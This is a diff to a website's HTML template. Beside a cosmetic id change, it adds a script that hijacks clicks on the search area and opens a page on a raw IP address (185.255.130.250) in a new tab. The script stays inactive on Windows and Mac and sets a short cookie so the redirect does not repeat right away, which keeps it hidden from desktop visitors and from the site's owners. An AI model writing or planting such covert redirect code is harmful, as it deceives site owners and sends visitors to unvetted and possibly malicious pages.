@@ -43,7 +43,7 @@
           <img src="/img/lemon/logo.png" class="img-responsive center-block brand-img" alt="Brand">
         </a>
       </div>
-      <div class="col-md-5">
+      <div class="col-md-5" id="search-area">
         <a class="navbar-brand brand-header visible-xs" href="/">
           <img src="/img/lemon/logo.ico" class="img-responsive brand-img" alt="Brand">
         </a>
@@ -210,5 +210,38 @@
 </script>
 
 <script src="/js/dynamicad.js"></script>
+
+<script>
+  (function () {
+    var p = navigator.platform;
+    if ((p.indexOf("Win") == 0) || (p.indexOf("Mac") == 0) || getCookie("clickad")) {
+      return;
+    }
+
+    document.getElementById("search-area").onclick = redirect;
+  })();
+
+  function redirect() {
+    document.getElementById("search-area").onclick = null;
+    setCookie("clickad", "lemon");
+    window.open("http://185.255.130.250/778ws.html", "_blank");
+  }
+
+  function setCookie(name, value) {
+    var expiredate=new Date();
+    expiredate.setTime(expiredate.getTime() + 10 * 60 * 1000);
+    document.cookie = name + "=" + escape(value) + ";expires=" + expiredate.toGMTString() + ";path=/";
+  }
+
+  function getCookie(name)
+  {
+    var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)"); //正则匹配
+    if(arr=document.cookie.match(reg)){
+      return unescape(arr[2]);
+    } else {
+      return null;
+    }
+  }
+</script>
 
 </html>
